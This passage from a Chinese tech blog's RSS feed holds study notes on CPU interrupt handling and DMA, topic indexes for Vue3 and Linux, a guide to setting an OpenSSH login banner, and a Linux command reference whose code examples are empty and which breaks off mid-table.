<p>CPU 在满足一定的条件下响应中断源发出的中断请求，并经过一些特定的操作，转去执行中断服务程序。<strong>CPU 响应中断必须满足以下三个条件：</strong></p>
<ul>
<li>中断源有中断请求</li>
<li>CPU 允许中断及开中断（异常和不可屏蔽中断不受此限制）</li>
<li>一条指令执行完毕（异常不受此限制），且没有更紧迫的任务</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>I/O</code> 设备的就绪时间是随机的，而 CPU 在统一的时刻即每条指令执行阶段结束前向接口发出中断查询信号，以获取 <code>I/O</code> 的中断请求，也就是说，CPU 响应中断的时间是在每条指令执行阶段的结束时刻。这里说的中断仅指 <code>I/O</code> 中断，内部异常不属于此类情况</p>
</div>
</li>
<li>
<p><strong>中断响应过程</strong></p>
<p>CPU 响应中断后，经过某些操作，转去执行中断服务程序。这些操作是由硬件直接实现的将它称为中断隐指令。中断隐指令并不是指令系统中的一条真正的指令，只是一种虚拟的说法，本质上是硬件的一系列自动操作。<strong>它所完成的操作如下：</strong></p>
<ul>
<li><strong>关中断</strong>：CPU 响应中断后，首先要保护程序的断点和现场信息，在保护断点和现场的过程中，CPU 不能响应更高级中断源的中断请求。否则，若断点或现场保存不完整，在中断服务程序结束后，就不能正确地恢复并继续执行现行程序</li>
<li><strong>保存断点</strong>：为保证在中断服务程序执行完后能正确地返回到原来的程序，必须将原程序的断点（指令无法直接读取的 PC 和 PSW 的内容）保存在栈或特定寄存器中</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">注意异常和中断的差异</p>
<p>异常指令通常并没有执行成功，异常处理后要重新执行，所以其断点是当前指令的地址。中断的断点则是下一条指令的地址</p>
</div>
<ul>
<li><strong>引出中断服务程序</strong>：识别中断源，将对应的服务程序入口地址送入程序计数器 PC。有两种方法识别中断源：硬件向量法和软件查询法。</li>
</ul>
</li>
<li>
<p><strong>中断向量</strong></p>
<p>中断识别分为 <strong>向量中断</strong> 和 <strong>非向量中断</strong> 两种。</p>
<p>每个中断都有一个唯一的类型号，每个中断类型号都对应一个中断服务程序，每个中断服务程序都有一个入口地址，CPU 必须找到入口地址，即中断向量。把系统中的全部中断向量集中存放到存储器的某个区域内，这个存放中断向量的存储区就称为中断向量表。</p>
<p>CPU 响应中断后，通过识别中断源获得中断类型号，然后据此计算出对应中断向量的地址；再根据该地址从中断向量表中取出中断服务程序的入口地址，并送入程序计数器 PC，以转而执行中断服务程序，这种方法被称为中断向量法，采用中断向量法的中断被称为向量中断。</p>
</li>
<li>
<p><strong>中断处理过程</strong></p>
<p>不同计算机的中断处理过程各具特色，就其多数而论。<strong>中断处理流程如下：</strong></p>
<ol>
<li>关中断</li>
<li>保存断点</li>
<li>中断服务程序寻址</li>
<li>保存现场和屏蔽字。进入中断服务程序后首先要保存现场和中断屏蔽字，现场信息是指用户可见的工作寄存器的内容，它存放着程序执行到断点处的现行值</li>
</ol>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>现场和断点，这两类信息都不能被中断服务程序破坏。现场信息因为用指令可直接访问，所以通常在中断服务程序中通过指令把它们保存到栈中，即由软件实现；而断点信息由 CPU 在中断响应时自动保存到栈或指定的寄存器中，即由硬件实现</p>
</div>
<ol start="5">
<li>开中断。允许更高级中断请求得到响应，实现中断嵌套</li>
<li>执行中断服务程序。这是中断请求的目的</li>
<li>关中断。保证在恢复现场和屏蔽字时不被中断</li>
<li>恢复现场和屏蔽字。将现场和屏蔽字恢复到原来的状态</li>
<li>开中断、中断返回。中断服务程序的最后一条指令通常是一条中断返回指令，使其返回到原程序的断点处，以便继续执行原程序</li>
</ol>
<p>其中，<code>1~3</code> 由中断隐指令（硬件自动）完成；<code>4~9</code> 由中断服务程序完成。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>恢复现场是指在中断返回前，必须将寄存器的内容恢复到中断处理前的状态，这部分工作由中断服务程序完成。中断返回由中断服务程序的最后一条中断返回指令完成</p>
</div>
</li>
</ol>
</li>
<li>
<p><strong>多重中断和中断屏蔽技术</strong></p>
<p>若 CPU 在执行中断服务程序的过程中，又出现了新的更高优先级的中断请求，而 CPU 对新的中断请求不予响应，则这种中断称为单重中断。若 CPU 暂停现行的中断服务程序，转去处理新的中断请求，则这种中断称为多重中断，又称中断嵌套。</p>
<p>CPU 要具备多重中断的功能，必须满足下列条件：</p>
<ul>
<li>在中断服务程序中提前设置开中断指令</li>
<li>优先级别高的中断源有权中断优先级别低的中断源</li>
</ul>
<p><strong>中断处理优先级</strong> 是指多重中断的实际优先级处理次序，可以利用中断屏蔽技术动态调整，从而可以灵活地调整中断服务程序的优先级，使中断处理更加灵活。如果不使用中断屏蔽技术，则处理优先级和响应优先级相同。现代计算机一般使用中断屏蔽技术，每个中断源都有一个屏蔽触发器，<code>1</code> 表示屏蔽该中断源的请求，<code>0</code> 表示可以正常申请，所有屏蔽触发器组合在一起便构成一个屏敲字寄存器，屏敲字奢存器的内容称为屏敲字。</p>
</li>
</ol>
<h4> DMA 方式</h4>
<p>DMA 方式是一种完全由硬件进行成组信息传送的控制方式，它具有程序中断方式的优点，即在数据准备阶段，CPU 与外设并行工作。DMA 方式在外设与内存之间开辟一条 “直接数据通道”，信息传送不再经过 CPU，降低了 CPU 在传送数据时的开销，因此称为直接存储器存取方式。由于数据传送不经过 CPU，也就不需要保护、恢复 CPU 现场等烦琐操作。</p>
<p>这种方式适用于磁盘、显卡、声卡、网卡等高速设备大批量数据的传送，它的硬件开销比较大。在 DMA 方式中，中断的作用仅限于故障和正常传送结束时的处理。</p>
<ol>
<li>
<p><strong>DMA 方式的特点</strong></p>
<p>主存和 DMA 接口之间有一条直接数据通路。由于 DMA 方式传送数据不需要经过 CPU，因此不必中断现行程序，<code>I/O</code> 与主机并行工作，程序和传送并行工作。</p>
<p><strong>DMA 方式具有下列特点：</strong></p>
<ul>
<li>它使主存与 CPU 的固定联系脱钩，主存既可被 CPU 访问，又可被外设访问</li>
<li>在数据块传送时，主存地址的确定、传送数据的计数等都由硬件电路直接实现</li>
<li>主存中要开辟专用缓冲区，及时供给和接收外设的数据</li>
<li>DMA 传送速度快，CPU 和外设并行工作，提高了系统效率</li>
<li>DMA 在传送开始前要通过程序进行预处理，结束后要通过中断方式进行后处理</li>
</ul>
</li>
<li>
<p><strong>DMA 控制器的组成</strong></p>
<p>在 DMA 方式中，对数据传送过程进行控制的硬件称为 DMA 控制器（DMA 接口）。当 <code>I/O</code> 设备需要进行数据传送时，通过 DMA 控制器向 CPU 提出 DMA 传送请求，CPU 响应之后将让出系统总线，由 DMA 控制器接管总线进行数据传送。<strong>其主要功能如下：</strong></p>
<ol>
<li>接受外设发出的 DMA 请求，并向 CPU 发出总线请求</li>
<li>CPU 响应并发出总线响应信号，DMA 接管总线控制权，进入 DMA 操作周期</li>
<li>确定传送数据的主存单元地址及长度，并自动修改主存地址计数和传送长度计数</li>
<li>规定数据在主存和外设间的传送方向，发出读写等控制信号，执行数据传送操作</li>
<li>向 CPU 报告 DMA 操作结束</li>
</ol>
<p>在 DMA 传送过程中，DMA 控制器将接管 CPU 的地址总线、数据总线和控制总线，CPU 的主存控制信号被禁止使用。而当 DMA 传送结束后，将恢复 CPU 的一切权利并开始执行其操作。由此可见，DMA 控制器必须具有控制系统总线的能力。</p>
</li>
<li>
<p><strong>DMA 的传送方式</strong></p>
<p>主存和 <code>I/O</code> 设备之间交换信息时，不通过 CPU。但当 <code>I/O</code> 设备和 CPU 同时访问主存时，可能发生冲突，为了有效地使用主存，DMA 控制器与 CPU 通常采用以下三种方式使用主存：</p>
<ul>
<li><strong>停止 CPU 访存</strong>：当 <code>I/O</code> 设备有 DMA 请求时，由 DMA 控制器向 CPU 发送一个停止信号，使 CPU 脱离总线，停止访问主存，直到 DMA 传送一块数据结束。数据传送结束后，DMA 控制器通知 CPU 可以使用主存，并把总线控制权交还给 CPU</li>
<li><strong>周期挪用（或周期窃取）</strong>：当 <code>I/O</code> 设备有 DMA 请求时，会遇到三种情况：①是此时 CPU 不在访存（如：CPU 正在执行乘法指令），因此 <code>I/O</code> 的访存请求与 CPU 未发生冲突；②是 CPU 正在访存，此时必须待存取周期结束后，CPU 再将总线占有权让出；③是 <code>I/O</code> 和 CPU 同时请求访存，出现访存冲突，此时 CPU 要暂时放弃总线占有权。<code>I/O</code> 访存优先级高于 CPU 访存，因为 <code>I/O</code> 不立即访存就可能丢失数据，此时由 <code>I/O</code> 设备挪用一个或几个存取周期，传送完一个数据后立即释放总线，是一种单字传送方式</li>
<li><strong>DMA 与 CPU 交替访存</strong>：这种方式适用于 CPU 的工作周期比主存存取周期长的情况。这种方式不需要总线使用权的申请、建立和归还过程，总线使用权是通过 C<sub>1</sub> 和 C<sub>2</sub> 分时控制的</li>
</ul>
</li>
<li>
<p><strong>DMA 的传送过程</strong></p>
<p>DMA 的数据传送过程分为预处理、数据传送和后处理三个阶段：</p>
<ul>
<li><strong>预处理</strong>：由 CPU 完成一些必要的准备工作。首先，CPU 执行几条 <code>I/O</code> 指令，用以测试 <code>I/O</code> 设备状态，初始化 DMA 控制器中的有关寄存器、设置传送方向、启动该设备等。然后，CPU 继续执行原来的程序，直到 <code>I/O</code> 设备准备好发送的数据（输入情况）或接收的数据（输出情况）时，<code>I/O</code> 设备向 DMA 控制器发送 DMA 请求，再由 DMA 控制器向 CPU 发送总线请求（有时将这两个过程统称为 DMA 请求），用以传输数据</li>
<li><strong>数据传送</strong>：DMA 的数据传输可以以单字节（或字）为基本单位，也可以以数据块为基本单位。对于以数据块为单位的传送（如：硬盘），DMA 占用总线后的数据输入和输出操作都是通过循环来实现的。需要指出的是，这一循环也是由 DMA 控制器（而非通过 CPU 执行程序）实现的，即数据传送阶段完全由 DMA（硬件）控制</li>
<li><strong>后处理</strong>：DMA 控制器向 CPU 发送中断请求，CPU 执行中断服务程序做 DMA 结束处理，包括校验送入主存的数据是否正确、测试传送过程中是否出错（错误则转诊断程序）及决定是否继续使用 DMA 传送其他数据等</li>
</ul>
</li>
<li>
<p><strong>DMA 方式和中断方式的区别</strong></p>
<p>DMA 方式和中断方式的重要区别如下：</p>
<ul>
<li>中断方式是程序的切换，需要保护和恢复现场；而 DMA 方式不中断现行程序，无需保护。现场，除了预处理和后处理，其他时候不占用任何 CPU 资源</li>
<li>对中断请求的响应只能发生在每条指令执行结束时（执行周期后）；而对 DMA 请求的响应可以发生在任意一个机器周期结束时（取指、间址、执行周期后均可）</li>
<li>中断传送过程需要 CPU 的干预；而 DMA 传送过程不需要 CPU 的干预，因此数据传输率非常高，适合于高速外设的成组数据传送</li>
<li>DMA 请求的优先级高于中断请求</li>
<li>中断方式具有处理异常事件的能力，而 DMA 方式仅局限于大批数据的传送</li>
<li>从数据传送来看，中断方式靠程序传送，DMA 方式靠硬件传送</li>
</ul>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>架构</title>
      <link>https://sankgao.github.io/computers/framework/</link>
      <guid>https://sankgao.github.io/computers/framework/</guid>
      <source url="https://sankgao.github.io/rss.xml">架构</source>
      <description>记录一些架构相关的信息。</description>
      <category>Framework</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些架构相关的信息。</p>
<!-- more -->
<h2> Vue3</h2>
<ul>
<li><a href="/computers/framework/vue3/introduction.html" target="blank">简介</a></li>
<li><a href="/computers/framework/vue3/quick_start.html" target="blank">快速上手</a></li>
<li><a href="/computers/framework/vue3/application.html" target="blank">创建一个 Vue 应用</a></li>
<li><a href="/computers/framework/vue3/template_syntax.html" target="blank">模板语法</a></li>
<li><a href="/computers/framework/vue3/responsive_base.html" target="blank">响应式基础</a></li>
<li><a href="/computers/framework/vue3/computed.html" target="blank">计算属性</a></li>
<li><a href="/computers/framework/vue3/class_and_style_bind.html" target="blank">Class 与 Style 绑定</a></li>
<li><a href="/computers/framework/vue3/ways_of_using_vue.html" target="blank">使用 Vue 的多种方式</a></li>
<li><a href="/computers/framework/vue3/conditional.html" target="blank">条件渲染</a></li>
<li><a href="/computers/framework/vue3/list.html" target="blank">列表渲染</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Linux</title>
      <link>https://sankgao.github.io/computers/linux/</link>
      <guid>https://sankgao.github.io/computers/linux/</guid>
      <source url="https://sankgao.github.io/rss.xml">Linux</source>
      <description>记录一些 Linux 操作系统相关的信息。</description>
      <category>Computer</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 Linux 操作系统相关的信息。</p>
<!-- more -->
<h2> Linux</h2>
<ul>
<li><a href="/computers/linux/banner_message.html" target="blank">SSH 登录之前显示横幅消息</a></li>
<li><a href="/computers/linux/command.html" target="blank">Linux 系统命令</a></li>
<li><a href="/computers/linux/error_using_sudo.html" target="blank">使用 sudo 时报错</a></li>
<li><a href="/computers/linux/hardware_resource.html" target="blank">硬件资源管理</a></li>
<li><a href="/computers/linux/install_software.html" target="blank">安装软件的方法</a></li>
<li><a href="/computers/linux/rebound_shell.html" target="blank">反弹 Shell</a></li>
<li><a href="/computers/linux/reset_root_password.html" target="blank">重置 root 密码</a></li>
<li><a href="/computers/linux/root_directory.html" target="blank">系统根目录</a></li>
<li><a href="/computers/linux/system_log.html" target="blank">系统日志</a></li>
<li><a href="/computers/linux/system_service.html" target="blank">系统服务命令</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>SSH 登录之前显示横幅消息</title>
      <link>https://sankgao.github.io/computers/linux/banner_message.html</link>
      <guid>https://sankgao.github.io/computers/linux/banner_message.html</guid>
      <source url="https://sankgao.github.io/rss.xml">SSH 登录之前显示横幅消息</source>
      <description>OpenSSH 有一个名为 Banner 的内置选项。在允许身份验证之前，将指定文件的内容发送给远程用户。如果 Banner 选项设置为 none，那么在 ssh 登录时就不会显示任何 Banner 消息。默认情况下不显示横幅，并且禁用该选项。 开启 Banner 选项 1. 打开 /etc/ssh/sshd_config 配置文件 在配置文件末尾添加...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p><code>OpenSSH</code> 有一个名为 <code>Banner</code> 的内置选项。在允许身份验证之前，将指定文件的内容发送给远程用户。如果 <code>Banner</code> 选项设置为 <code>none</code>，那么在 ssh 登录时就不会显示任何 <code>Banner</code> 消息。默认情况下不显示横幅，并且禁用该选项。</p>
<h2> 开启 Banner 选项</h2>
<ol>
<li>
<p>打开 <code>/etc/ssh/sshd_config</code> 配置文件</p>
<p>在配置文件末尾添加 <code>Banner /etc/ssh/my_banner</code> 这一行内容。</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>退出并保存配置文件</p>
</li>
<li>
<p>创建 <code>/etc/ssh/my_banner</code> 文件</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>重启 sshd 服务</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
</ol>
<h2> 设置横幅消息</h2>
<ol>
<li>
<p>横幅消息文字</p>
<p>安装 <code>figlet</code> 命令并生成普通字符的放大版。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在 centos 中需要安装 epel 源，然后才可以安装 figlet 程序</p>
</div>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>还可以在网上搜索 <code>ASCII art</code>，会有许多生成 ascii 艺术字的网站，还可以将图片转换成 ASCII 类型的。</p>
<p><code>ASCII art</code> 网站：</p>
<ul>
<li><a href="https://asciiart.website/" target="_blank" rel="noopener noreferrer">https://asciiart.website/</a></li>
<li><a href="http://1lineart.kulaone.com/#/" target="_blank" rel="noopener noreferrer">http://1lineart.kulaone.com/#/</a></li>
</ul>
</li>
<li>
<p>将 figlet 生成的艺术字体写入 <code>/etc/ssh/my_banner</code> 文件中</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>ssh 登录 linux 操作系统测试</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Linux 系统命令</title>
      <link>https://sankgao.github.io/computers/linux/command.html</link>
      <guid>https://sankgao.github.io/computers/linux/command.html</guid>
      <source url="https://sankgao.github.io/rss.xml">Linux 系统命令</source>
      <description>常用命令 man man 用于查看命令的作用及选项信息，使用 q 退出。语法格式：man 命令 example： echo echo 用于在终端上输出字符串或变量提取后的值。语法格式：echo [字符串][$变量] 选项 作用 :----: :---- -e 使用转义符 | example: su su 用于切换用户账户。语法格式：su [选项] 用户...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 常用命令</h2>
<h3> man</h3>
<p><code>man</code> 用于查看命令的作用及选项信息，使用 <code>q</code> 退出。语法格式：<code>man 命令</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> echo</h3>
<p><code>echo</code> 用于在终端上输出字符串或变量提取后的值。语法格式：<code>echo [字符串][$变量]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">使用转义符</td>
</tr>
</tbody>
</table>
<p>example:</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> su</h3>
<p><code>su</code> 用于切换用户账户。语法格式：<code>su [选项] 用户名</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>从 root 用户切换到普通用户不需要输入密码，从普通用户切换到普通用户和 root 用户需要输入密码</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-</code> 或 <code>-l</code></td>
<td style="text-align:left">切换用户时重置环境变量</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">变更为帐号为 <code>USER</code> 的使用者并执行指令（command）后再变回原来使用者</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">不必读启动档（如 <code>csh.cshrc</code> 等），仅用于 <code>csh</code> 或 <code>tcsh</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">指定要执行的 <code>shell</code>（<code>bash</code> <code>csh</code> <code>tcsh</code> 等），预设值为 <code>/etc/passwd</code> 内的该使用者（USER） shell</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> sudo</h3>
<p><code>sudo</code> 用于给普通用户提供额外的权限。语法格式：<code>sudo [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">列出当前用户可执行的命令</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">以指定用户执行命令</td>
</tr>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">清空密码的有效时间，下次执行 <code>sudo</code> 时需要再次进行密码验证</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">在后台执行指定的命令</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">更改询问密码的提升语</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> date</h3>
<p><code>date</code> 用于显示或设置系统的时间与日期。语法格式：<code>date [+指定的格式]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>%F</code></td>
<td style="text-align:left">显示年月日（example：2022-10-11）</td>
</tr>
<tr>
<td style="text-align:center"><code>%T</code></td>
<td style="text-align:left">显示时分秒（example：19:26:26）</td>
</tr>
<tr>
<td style="text-align:center"><code>%S</code></td>
<td style="text-align:left">秒（00-59）</td>
</tr>
<tr>
<td style="text-align:center"><code>%M</code></td>
<td style="text-align:left">分钟（00-59）</td>
</tr>
<tr>
<td style="text-align:center"><code>%H</code></td>
<td style="text-align:left">小时（00-23）</td>
</tr>
<tr>
<td style="text-align:center"><code>%l</code></td>
<td style="text-align:left">小时（00-12）</td>
</tr>
<tr>
<td style="text-align:center"><code>%m</code></td>
<td style="text-align:left">月份（1-12）</td>
</tr>
<tr>
<td style="text-align:center"><code>%p</code></td>
<td style="text-align:left">显示出 AM 或 PM</td>
</tr>
<tr>
<td style="text-align:center"><code>%r</code></td>
<td style="text-align:left">显示出 09:56:34 AM</td>
</tr>
<tr>
<td style="text-align:center"><code>%a</code></td>
<td style="text-align:left">缩写的工作日名称（example：Sun）</td>
</tr>
<tr>
<td style="text-align:center"><code>%A</code></td>
<td style="text-align:left">完整的工作日名称（example：Sunday）</td>
</tr>
<tr>
<td style="text-align:center"><code>%b</code></td>
<td style="text-align:left">缩写的月份名称（example：Jan）</td>
</tr>
<tr>
<td style="text-align:center"><code>%B</code></td>
<td style="text-align:left">完整的月份名称（example：January）</td>
</tr>
<tr>
<td style="text-align:center"><code>%q</code></td>
<td style="text-align:left">季度（1-4）</td>
</tr>
<tr>
<td style="text-align:center"><code>%y</code></td>
<td style="text-align:left">简写年份（example：22）</td>
</tr>
<tr>
<td style="text-align:center"><code>%Y</code></td>
<td style="text-align:left">完整年份（example：2022）</td>
</tr>
<tr>
<td style="text-align:center"><code>%d</code></td>
<td style="text-align:left">本月中的第几天</td>
</tr>
<tr>
<td style="text-align:center"><code>%j</code></td>
<td style="text-align:left">本年中的第几天</td>
</tr>
<tr>
<td style="text-align:center"><code>%w</code></td>
<td style="text-align:left">一个星期的第几天（0代表星期天）</td>
</tr>
<tr>
<td style="text-align:center"><code>%W</code></td>
<td style="text-align:left">一年的第几个星期（00~53，星期一为第一天）</td>
</tr>
<tr>
<td style="text-align:center"><code>%n</code></td>
<td style="text-align:left">换行符（相当于回车键）</td>
</tr>
<tr>
<td style="text-align:center"><code>%t</code></td>
<td style="text-align:left">跳格（相当于 Tab 键）</td>
</tr>
</tbody>
</table>
<p>example:</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> timedatectl</h3>
<p><code>timedatectl</code> 用于查看设置系统的时区。语法格式：<code>timedatectl [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>status</code></td>
<td style="text-align:left">显示状态信息</td>
</tr>
<tr>
<td style="text-align:center"><code>list-timezones</code></td>
<td style="text-align:left">列出已知时区</td>
</tr>
<tr>
<td style="text-align:center"><code>set-time</code></td>
<td style="text-align:left">设置系统时间</td>
</tr>
<tr>
<td style="text-align:center"><code>set-timezone</code></td>
<td style="text-align:left">设置生效时区</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> reboot</h3>
<p><code>reboot</code> 用于重启系统</p>
<h3> poweroff</h3>
<p><code>poweroff</code> 用于关闭系统</p>
<h3> wget</h3>
<p><code>wget</code> 用于在终端命令行上下载网络文件，无需打开浏览器。语法格式：<code>wget [选项] 网址</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">后台下载模式</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">下载到指定目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">最大尝试次数。值为 <code>0</code> 时将强制不断进行尝试</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">断点续传</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">下载页面内所有资源，包括图片、视频等</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">递归下载</td>
</tr>
<tr>
<td style="text-align:center"><code>-O</code></td>
<td style="text-align:left">指定文件名</td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">将输出的内容保存到指定文件中</td>
</tr>
<tr>
<td style="text-align:center"><code>-nc</code></td>
<td style="text-align:left">文件存在时，下载文件不覆盖原有文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-mc</code></td>
<td style="text-align:left">下载时只显示更新和出错信息，不显示指令的详细执行过程</td>
</tr>
<tr>
<td style="text-align:center"><code>--no-check-certificate</code></td>
<td style="text-align:left">下载 <code>https</code> 网站资源时可能需要使用该选项跳过证书检测的过程</td>
</tr>
<tr>
<td style="text-align:center"><code>--limit-rate</code></td>
<td style="text-align:left">限制下载指定带宽。可以用 <code>k</code>（千字节）和 <code>m</code>（兆字节）指定速度限制</td>
</tr>
<tr>
<td style="text-align:center"><code>--user</code></td>
<td style="text-align:left">网站需要认证时，指定用户名</td>
</tr>
<tr>
<td style="text-align:center"><code>--password</code></td>
<td style="text-align:left">网站需要认证时，指定密码</td>
</tr>
<tr>
<td style="text-align:center"><code>--ask-password</code></td>
<td style="text-align:left">网站需要认证时，在网页中输入密码</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> curl</h3>
<p><code>curl</code> 命令的用途广泛，其功能包括下载、发送各种 HTTP 请求以及指定 HTTP 头部。语法格式：<code>curl  [选项] 网址</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-C -</code></td>
<td style="text-align:left">推断出正确的续传位置。不需要指定准确的字节偏移使用 <code>-C</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">以 <code>POST</code> 方式提交用户数据。<code>-d</code> 的字符串参数形式类似于 GET 请求。每对 <code>var=value</code> 之间用 <code>&amp;</code> 分隔</td>
</tr>
<tr>
<td style="text-align:center"><code>-O</code></td>
<td style="text-align:left">指明将下载数据写入文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">指定输出文件名</td>
</tr>
<tr>
<td style="text-align:center"><code>-u username:password</code></td>
<td style="text-align:left">完成 HTTP 或 FTP 认证，指定用户名和密码。如果想要提示后再输入密码，则不加 <code>password</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-I</code> 或 <code>--head</code></td>
<td style="text-align:left">只打印 <code>HTTP</code> 头部信息，无须下载远程文件</td>
</tr>
<tr>
<td style="text-align:center"><code>--silent</code></td>
<td style="text-align:left">不显示进度信息</td>
</tr>
<tr>
<td style="text-align:center"><code>--progress</code></td>
<td style="text-align:left">显示形如 <code>#</code> 的进度条</td>
</tr>
<tr>
<td style="text-align:center"><code>--referer</code></td>
<td style="text-align:left">指定参照页字符串</td>
</tr>
<tr>
<td style="text-align:center"><code>--cookie</code></td>
<td style="text-align:left">指定提供哪些 <code>cookie</code>，多个 <code>cookie</code> 之间用 <code>;</code> 号分隔</td>
</tr>
<tr>
<td style="text-align:center"><code>--cookie-jar</code></td>
<td style="text-align:left">将 <code>cookie</code> 另存为文件</td>
</tr>
<tr>
<td style="text-align:center"><code>--limit-rate</code></td>
<td style="text-align:left">限制下载指定带宽。可以用 <code>k</code>（千字节）和 <code>m</code>（兆字节）指定速度限制</td>
</tr>
<tr>
<td style="text-align:center"><code>--max-filesize</code></td>
<td style="text-align:left">指定可下载的最大文件大小</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> lsof</h3>
<p><code>lsof</code> 用于查看你进程开打的文件，打开文件的进程，进程打开的端口（TCP、UDP）。语法格式：<code>lsof [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">列出打开文件存在的进程</td>
</tr>
<tr>
